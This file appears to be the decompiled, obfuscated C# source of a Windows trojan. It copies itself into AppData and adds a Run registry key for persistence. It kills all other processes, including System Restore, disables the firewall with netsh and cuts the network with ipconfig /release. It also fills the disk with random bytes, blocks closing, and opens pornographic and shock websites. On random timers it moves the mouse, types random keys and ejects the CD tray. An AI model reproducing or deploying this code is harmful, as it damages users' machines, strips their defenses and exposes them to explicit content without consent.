using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace vifc5jEr5oNDtDKYKQb3DrNl6v;

public class vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV : Form
{
	private string vifc5jEr5oNDtDKYKQb3D;

	private string[] vifc5jEr5oNDtDKYKQb3DrNl6vflwh;

	private Point vifc5jEr5oNDtDKY;

	private IContainer m_vifc5jEr5oNDtDK;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh;

	private Timer vifc5jEr5oN;

	private Timer vifc5jEr5oNDtDKYKQb3DrN;

	private Timer vifc5jEr5oNDtDKYKQ;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vf;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD;

	private Timer m_vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu;

	private Timer vifc5jEr5oN;

	private Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwh;

	private Timer vifc5jEr5oNDtDKYKQ;

	[DllImport("user32.dll")]
	private static extern int SwapMouseButton(int bSwap);

	private static void SwapMouse(int value)
	{
		try
		{
			SwapMouseButton(value);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	private static void TaskBar(int value)
	{
		try
		{
			int hwnd = FindWindow("Shell_TrayWnd", "");
			ShowWindow(hwnd, value);
		}
		catch
		{
		}
	}

	private static void OnExecution()
	{
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static void PlaySong()
	{
		while (true)
		{
			Console.Beep(440, 500);
			Console.Beep(440, 500);
			Console.Beep(440, 500);
			Console.Beep(349, 350);
			Console.Beep(523, 150);
			Console.Beep(440, 500);
			Console.Beep(349, 350);
			Console.Beep(523, 150);
			Console.Beep(440, 1000);
			Console.Beep(659, 500);
			Console.Beep(659, 500);
			Console.Beep(659, 500);
			Console.Beep(698, 350);
			Console.Beep(523, 150);
			Console.Beep(415, 500);
			Console.Beep(349, 350);
			Console.Beep(523, 150);
			Console.Beep(440, 1000);
		}
	}

	public vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV()
	{
		Xaet7NBtzLxfe2Ks9();
		vifc5jEr5oNDtDKYKQb3D = "nguid";
		vifc5jEr5oNDtDK(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		Thread.Sleep(1000);
	}

	private void vifc5jEr5oNDtDK(string vifc5jEr5oNDtDKYKQb3DrNl6vfl)
	{
		try
		{
			if (!(Application.get_StartupPath() == vifc5jEr5oNDtDKYKQb3DrNl6vfl))
			{
				File.Copy(Application.get_ExecutablePath(), vifc5jEr5oNDtDKYKQb3DrNl6vfl + "\\" + vifc5jEr5oNDtDKYKQb3D + ".exe");
				Process.Start(vifc5jEr5oNDtDKYKQb3DrNl6vfl + "\\" + vifc5jEr5oNDtDKYKQb3D + ".exe");
				Process currentProcess = Process.GetCurrentProcess();
				currentProcess.Kill();
			}
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNhlal4n(object sender, EventArgs e)
	{
		for (int i = 0; i < 3; i++)
		{
			((Control)this).Hide();
		}
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh.Stop();
	}

	private void Xaet7NBtzLxfe2(object sender, EventArgs e)
	{
		Xaet7NBtzLxfe2Ks9fJNhl();
	}

	private void Xaet7NBtzLxfe2Ks9fJNhl()
	{
		try
		{
			vifc5jEr5oNDtDKYKQb3D = "nguid";
			this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh = "rstrui".Split(new char[1] { '.' });
			if (this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh[0] != "")
			{
				vifc5jEr5oNDtDKYKQb3DrN.set_Enabled(true);
			}
			vifc5jEr5oN.set_Enabled(true);
			new Thread(Calculus).Start();
			new Thread(WriteFile).Start();
		}
		catch
		{
		}
	}

	private static void WriteFile()
	{
		try
		{
			using FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmpus.tmp", FileMode.Append);
			Random random = new Random();
			byte[] array = new byte[1];
			while (true)
			{
				random.NextBytes(array);
				fileStream.WriteByte(array[0]);
			}
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNh()
	{
		while (true)
		{
			Thread.Sleep(130);
			Cursor.set_Position(vifc5jEr5oNDtDKY);
		}
	}

	private static void Calculus()
	{
		int num = 0;
		while (true)
		{
			if (num == 200)
			{
				num = 0;
			}
			num++;
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySX(object sender, EventArgs e)
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] array = this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh;
			foreach (string value in array)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void frmForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		catch
		{
		}
	}

	private static void tmrFirewall_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "netsh.exe";
			process.StartInfo.Arguments = "firewall set opmode disable";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJ(object sender, EventArgs e)
	{
		Random random = new Random();
		this.vifc5jEr5oNDtDKYKQ.set_Interval(random.Next(1000, 10000));
		new Thread(BeepThread).Start();
	}

	private static void BeepThread()
	{
		Console.Beep();
	}

	private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TN(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			vifc5jEr5oNDtDKYKQb3DrNl6vf.set_Interval(random.Next(4000, 120001));
			switch (random.Next(0, 5))
			{
			case 0:
				Process.Start("explorer.exe");
				break;
			case 1:
				Process.Start("notepad.exe");
				break;
			case 2:
				Process.Start("mspaint.exe");
				break;
			case 3:
				Process.Start("write.exe");
				break;
			case 4:
				Process.Start("utilman.exe");
				break;
			}
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNhl(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU.set_Interval(random.Next(1000, 120000));
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			int num = random.Next(0, 8);
			this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.set_Interval(random.Next(5000, 120001));
			switch (num)
			{
			case 0:
				Process.Start("http://www.octopusgirl.com");
				break;
			case 1:
				Process.Start("http://www.loltrain.com");
				break;
			case 2:
				Process.Start("http://www.youporn.com");
				break;
			case 3:
				Process.Start("http://trololololololololololo.com/");
				break;
			case 4:
				Process.Start("http://www.fuckme.com");
				break;
			case 5:
				Process.Start("http://maytheforcebewithyou.com");
				break;
			case 6:
				Process.Start("http://meatspin.com");
				break;
			case 7:
				Process.Start("http://www.youporngay.com");
				break;
			}
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNhla(object sender, EventArgs e)
	{
		Point position = default(Point);
		Random random = new Random();
		int num = random.Next(2);
		int num2 = random.Next(2);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD.set_Interval(random.Next(1000, 60000));
		if (num == 1)
		{
			position.X = Control.get_MousePosition().X + random.Next(1, 300);
		}
		else
		{
			position.X = Control.get_MousePosition().X - random.Next(1, 300);
		}
		if (num2 == 1)
		{
			position.Y = Control.get_MousePosition().Y + random.Next(1, 300);
		}
		else
		{
			position.Y = Control.get_MousePosition().Y - random.Next(1, 300);
		}
		Cursor.set_Position(position);
	}

	private static void GenerateString()
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < random.Next(1, 31); i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
				stringBuilder.Append(value);
			}
			SendKeys.Send(stringBuilder.ToString());
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ(object sender, EventArgs e)
	{
		Random random = new Random();
		m_vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.set_Interval(random.Next(5000, 120000));
		GenerateString();
	}

	private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS(object sender, EventArgs e)
	{
		Random random = new Random();
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk.set_Interval(random.Next(5000, 60000));
		new Thread(OpenTray).Start();
	}

	[DllImport("winmm.dll")]
	private static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

	private static void OpenTray()
	{
		try
		{
			mciSendStringA("set CDAudio door open", "", 127L, 0L);
		}
		catch
		{
		}
	}

	private void Xaet7NBtzLxfe2Ks9(object sender, EventArgs e)
	{
		Random random = new Random();
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.set_Interval(random.Next(1000, 120000));
		ShowMsg();
	}

	private void Xaet7NBtzLxfe2(object sender, EventArgs e)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", vifc5jEr5oNDtDKYKQb3D, Application.get_ExecutablePath());
		}
		catch
		{
		}
	}

	private static void tmrDisconnect_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "ipconfig.exe";
			process.StartInfo.Arguments = "/release";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private static void tmrClipBoard_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(".");
		}
		catch
		{
		}
	}

	private static void ShowMsg()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		Form val = new Form();
		val.set_Size(new Size(1, 1));
		val.set_StartPosition((FormStartPosition)0);
		Rectangle virtualScreen = SystemInformation.get_VirtualScreen();
		val.set_Location(new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10));
		((Control)val).Show();
		((Control)val).Focus();
		((Control)val).BringToFront();
		val.set_TopMost(true);
		MessageBox.Show((IWin32Window)(object)val, ".", string.Empty, (MessageBoxButtons)0);
		((Component)(object)val).Dispose();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && this.m_vifc5jEr5oNDtDK != null)
		{
			this.m_vifc5jEr5oNDtDK.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void Xaet7NBtzLxfe2Ks9()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		this.m_vifc5jEr5oNDtDK = new Container();
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh = new Timer(this.m_vifc5jEr5oNDtDK);
		this.vifc5jEr5oN = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrN = new Timer(this.m_vifc5jEr5oNDtDK);
		this.vifc5jEr5oNDtDKYKQ = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrNl6vf = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU = new Timer(this.m_vifc5jEr5oNDtDK);
		this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD = new Timer(this.m_vifc5jEr5oNDtDK);
		m_vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oN = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwh = new Timer(this.m_vifc5jEr5oNDtDK);
		vifc5jEr5oNDtDKYKQ = new Timer(this.m_vifc5jEr5oNDtDK);
		((Control)this).SuspendLayout();
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh.set_Enabled(true);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhlal4n);
		this.vifc5jEr5oN.set_Interval(5000);
		this.vifc5jEr5oN.add_Tick((EventHandler)tmrFirewall_Tick);
		vifc5jEr5oNDtDKYKQb3DrN.set_Interval(500);
		vifc5jEr5oNDtDKYKQb3DrN.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySX);
		this.vifc5jEr5oNDtDKYKQ.set_Interval(1000);
		this.vifc5jEr5oNDtDKYKQ.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJ);
		vifc5jEr5oNDtDKYKQb3DrNl6vf.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TN);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhl);
		this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhlal4nrJ);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhla);
		m_vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.add_Tick((EventHandler)this.Xaet7NBtzLxfe2Ks9fJNhlal4nrJ);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.set_Interval(1000);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.add_Tick((EventHandler)Xaet7NBtzLxfe2Ks9);
		vifc5jEr5oN.set_Interval(1000);
		vifc5jEr5oN.add_Tick((EventHandler)this.Xaet7NBtzLxfe2);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwh.set_Interval(5000);
		vifc5jEr5oNDtDKYKQb3DrNl6vflwh.add_Tick((EventHandler)tmrDisconnect_Tick);
		vifc5jEr5oNDtDKYKQ.set_Interval(1000);
		vifc5jEr5oNDtDKYKQ.add_Tick((EventHandler)tmrClipBoard_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(32, 28));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("FrmMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmForm_FormClosing));
		((Form)this).add_Load((EventHandler)Xaet7NBtzLxfe2);
		((Control)this).ResumeLayout(false);
	}
}
